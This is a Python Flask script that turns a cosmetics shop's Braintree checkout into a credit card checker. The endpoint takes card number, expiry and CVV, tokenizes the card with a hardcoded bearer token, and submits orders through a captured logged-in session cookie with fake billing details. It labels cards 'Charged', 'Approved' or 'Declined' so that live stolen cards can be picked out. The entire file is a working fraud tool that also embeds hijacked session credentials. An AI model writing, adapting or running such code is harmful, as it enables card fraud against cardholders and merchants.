import requests
import re
import json
import uuid
from flask import Flask, request

app = Flask(__name__)

class EcosmeticsPayment:
    def __init__(self):
        self.session = requests.Session()
        self.cookies = {
            '_gcl_au': '1.1.472509716.1760778293',
            '_ga': 'GA1.1.260355234.1760778309',
            '__pr.d1zjip': '8r_agKnn9d',
            '_fbp': 'fb.1.1760778312473.662763495889949214',
            'cdn.ecosmeticsinc.101117.ka.ck': '53fa7ee3e97dc47fc0fdb6bff01d3347b1f4205055ba74fa07f143b5af5fdf331ebf0dc6f0e7cbe22f151321497ce5e7b1bf2a0c38217f2d680b51be36cc744bfe8fa687f3c23f9baffee1cccf0e8fe7f8f299a1bdd1c4a48ecab8e4593583f0daed8fb02e73d1f9f2418838f9731425fd22202760a067550d53f4265b0a5e29ad7fd9a60593354a92532bc7eeb9a9e4bedfc863b55e5e488c7bba',
            '__kla_id': 'JTdCJTIyZW1haWwlMjIlM0ElMjJ4Y3JhY2tlcjEwJTQwZ21haWwuY29tJTIyJTJDJTIyZmlyc3RfbmFtZSUyMiUzQSUyMkpvaG4lMjIlMkMlMjJsYXN0X25hbWUlMjIlM0ElMjJTbWl0aCUyMiU3RA==',
            'wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220': 'john.smith-5615%7C1761988602%7CIKVPCr9eY6nRF12P8MX2yCQvbKWKAhNgpzJ9WIDhT7k%7Cfef4f7a586ba1e412ef9cb33688723e5c2e2df2dfaf91eb700765c6491bac72e',
            'wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220': '9732510%7C1760951083%7C1760864683%7C%24generic%24RBilklGuEDlklAh3dPeHeDzvjieZFKrZD40LZfxu',
            'woocommerce_recently_viewed': '4340182',
            '_cfuvid': 'OV1zax4ywhONVAbkxjWX7DwmUzlEQ6pKto2xgOf7S60-1760798373883-0.0.1.1-604800000',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-10-18%2014%3A09%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fproduct%2Fmosquito-repellent-bands-3%2F%3Fattribute_pa_cliganic_size%3Dcliganic_1ct%26convert_to_sub_4340182%3D4_month%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-10-18%2014%3A09%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fproduct%2Fmosquito-repellent-bands-3%2F%3Fattribute_pa_cliganic_size%3Dcliganic_1ct%26convert_to_sub_4340182%3D4_month%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
            'KFPWOO_SESSION_ID': 'ZLOHtulG7s7xMcZFdSUvhk1760798376',
            'PHPSESSID': '5ede5bfcb638d024e4c3d87218dabf4f',
            'cf_clearance': 'vtSN6Nc.frnQw3xHrHSC.d30XGpS8wnGM801zNaor14-1760798686-1.2.1.1-_osW775HeejBR00J6f6fr1CU2_px8qat2qU1aP6_6KSx6qU0POsuC.KyX6tRhw3NtkKMHI5WJf9mCJc5y33eP0wa4Y_45n0ThOnaPzhy2mf.1R5XQqIgnlxoFveJVdwNlZwuRC0XWvaRYCOLizZ8caq_6G0ggIZ3kpq90n1gV1VX5d8t9qAybOpeyiofpjFNHDUNsEWf1O2Z4dliCG5AdzXHiQGpOkqJ2CLZ5gie8bs',
            '_uetsid': '8dc800b0ac0111f0978955553e31f47e',
            '_uetvid': '8dc857c0ac0111f09ae509a5ce9dec55',
            '_ga_4Z6R75ENPP': 'GS2.1.s1760797752$o3$g1$t1760798719$j20$l0$h0',
            '_ga_S104KL6WC3': 'GS2.1.s1760797752$o3$g1$t1760798719$j20$l0$h0',
            '_ga_S84EZBZ2FR': 'GS2.1.s1760797753$o3$g1$t1760798719$j20$l0$h684701897',
            'sbjs_session': 'pgs%3D15%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fproduct%2Fmosquito-repellent-bands-3%2F%3Fattribute_pa_cliganic_size%3Dcliganic_1ct%26convert_to_sub_4340182%3D4_month',
            'pmTPTrack': '%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.260355234.1760778309%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3A%22fb.1.1760778312473.662763495889949214%22%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22sccid%22%3Anull%2C%22ttclid%22%3Anull%2C%22msclkid%22%3Anull%2C%22twclid%22%3Anull%2C%22ga4SessionId%22%3A%224Z6R75ENPP%3As1760797752%24o3%24g1%24t1760798719%24j20%24l0%24h0%2CS104KL6WC3%3As1760797752%24o3%24g1%24t1760798719%24j20%24l0%24h0%2CS84EZBZ2FR%3As1760797753%24o3%24g1%24t1760798719%24j20%24l0%24h684701897%22%2C%22ga4SessionCount%22%3A%224Z6R75ENPP%3Aundefined%2CS104KL6WC3%3Aundefined%2CS84EZBZ2FR%3Aundefined%22%2C%22timestamp%22%3A1760798721%7D',
        }
        
        self.headers = {
            'accept': '*/*',
            'accept-language': 'en-GB',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.ecosmetics.com',
            'priority': 'u=1, i',
            'referer': 'https://www.ecosmetics.com/product/mosquito-repellent-bands-3/?attribute_pa_cliganic_size=cliganic_1ct&convert_to_sub_4340182=4_month',
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

    def generate_card_nonce(self, card_number, exp_month, exp_year, cvv):
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        braintree_headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjA4ODU2NDIsImp0aSI6IjQzYzBjZDhlLWVmNGItNDdjMS05MjNhLWRlZjM1M2VhYzIzYiIsInN1YiI6IjdkZmI4NjdkaDluN3FjbXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdkZmI4NjdkaDluN3FjbXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImVjb3NtZXRpY3NfaW5zdGFudCIsInBheXBhbF9jbGllbnRfaWQiOiJBY0M5X1VPTjhGdGJTVzZlNHRiMTFkOEFBRHk2aU55S0tpcVBBQ3JWQnZWb0d2ZEx0cFNBVFUzRXdMRExsZmpvTTVzSERMU2IyaVB1Vk5QNSJ9fQ.LOcPWyCKv7pOjIS0zhnpA_0cWGcRvA4JTniPYlJ6w9DXZgqx6KWaYywRQPAX3As4rlp5eies2QIi0Fh1Ned0Ig',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        tokenize_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': exp_month,
                        'expirationYear': exp_year,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '47528',
                            'streetAddress': '41581 David Heights Suite 167',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        try:
            response = self.session.post(
                'https://payments.braintree-api.com/graphql',
                headers=braintree_headers,
                json=tokenize_data,
                timeout=10
            )
            
            if response.status_code != 200:
                return None
            
            token_data = response.json()
            
            if 'errors' in token_data:
                return None
            
            if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
                return None
            
            card_token = token_data['data']['tokenizeCreditCard']['token']
            
            return {
                'card_nonce': card_token,
                'device_data': f'{{"correlation_id":"{correlation_id}"}}'
            }
            
        except Exception:
            return None

    def extract_nonce_from_site(self):
        checkout_url = "https://www.ecosmetics.com/checkout/"
        response = self.session.get(checkout_url, headers=self.headers, cookies=self.cookies)
        
        patterns = [
            r'name="woocommerce-process-checkout-nonce" value="([^"]+)"',
            r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"',
            r'<input[^>]*name="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"',
            r'var wc_checkout_params = {[^}]*"nonce":"([^"]+)"',
            r'woocommerce_checkout_params[^}]*"nonce":"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None

    def parse_checkout_response(self, response):
        try:
            json_data = response.json()
            
            if isinstance(json_data, dict):
                if json_data.get('result') != 'failure':
                    return {"status": "Charged", "response": "Payment successful"}
                else:
                    messages = json_data.get('messages', '')
                    
                    error_match = re.search(r'<li[^>]*>(.*?)</li>', messages, re.IGNORECASE | re.DOTALL)
                    if error_match:
                        error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
                        
                        if "Reason:" in error_text:
                            reason = error_text.split("Reason:")[-1].strip()
                        else:
                            reason = error_text
                        
                        reason_lower = reason.lower()
                        if "insufficient_funds" in reason_lower or "card issuer declined cvv" in reason_lower:
                            return {"status": "Approved", "response": reason}
                        else:
                            return {"status": "Declined", "response": reason}
                    else:
                        braintree_error = re.search(r'reason:\s*([^<]+)', messages, re.IGNORECASE)
                        if braintree_error:
                            reason = braintree_error.group(1).strip()
                            reason_lower = reason.lower()
                            if "insufficient_funds" in reason_lower or "card issuer declined cvv" in reason_lower:
                                return {"status": "Approved", "response": reason}
                            else:
                                return {"status": "Declined", "response": reason}
                        return {"status": "Declined", "response": "Payment failed"}
            return {"status": "Declined", "response": "Payment failed"}
        except Exception:
            return {"status": "Error", "response": "Invalid response"}

    def process_payment(self, card_number, exp_month, exp_year, cvv):
        try:
            card_data = self.generate_card_nonce(card_number, exp_month, exp_year, cvv)
            if not card_data:
                return {"status": "Error", "response": "Tokenization failed"}
            
            nonce = self.extract_nonce_from_site()
            if not nonce:
                return {"status": "Error", "response": "Nonce extraction failed"}
            
            data = {
                'billing_first_name': 'Rocky',
                'billing_last_name': 'OG',
                'billing_country': 'US',
                'billing_address_1': '156 William St',
                'billing_address_2': 'Fl 12',
                'billing_city': 'New York',
                'billing_state': 'NY',
                'billing_postcode': '10038-5322',
                'billing_phone': '9452185162',
                'billing_email': 'zerotracehacked@gmail.com',
                'shipping_first_name': 'Rocky',
                'shipping_last_name': 'OG',
                'shipping_country': 'US',
                'shipping_address_1': '156 William St',
                'shipping_address_2': 'Fl 12',
                'shipping_city': 'New York',
                'shipping_state': 'NY',
                'shipping_postcode': '10038-5322',
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': card_data['card_nonce'],
                'braintree_cc_device_data': card_data['device_data'],
                'woocommerce-process-checkout-nonce': nonce,
            }
            
            params = {
                'wc-ajax': 'checkout'
            }
            
            response = self.session.post(
                'https://www.ecosmetics.com/',
                params=params,
                headers=self.headers,
                cookies=self.cookies,
                data=data,
                timeout=30
            )
            
            return self.parse_checkout_response(response)
                
        except Exception as e:
            return {"status": "Error", "response": f"Processing error"}

@app.route('/gateway=b3$/cc=<cc>', methods=['GET'])
def process_cc(cc):
    parts = cc.split('|')
    if len(parts) != 4:
        return "Invalid format: Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"
    
    card_number = parts[0].strip()
    exp_month = parts[1].strip()
    exp_year = parts[2].strip()
    cvv = parts[3].strip()
    
    if len(exp_year) == 2:
        exp_year = '20' + exp_year
    
    payment = EcosmeticsPayment()
    result = payment.process_payment(card_number, exp_month, exp_year, cvv)
    
    return f"{result['status']}|{result['response']}"

if __name__ == "__main__":
    app.run(debug=True)
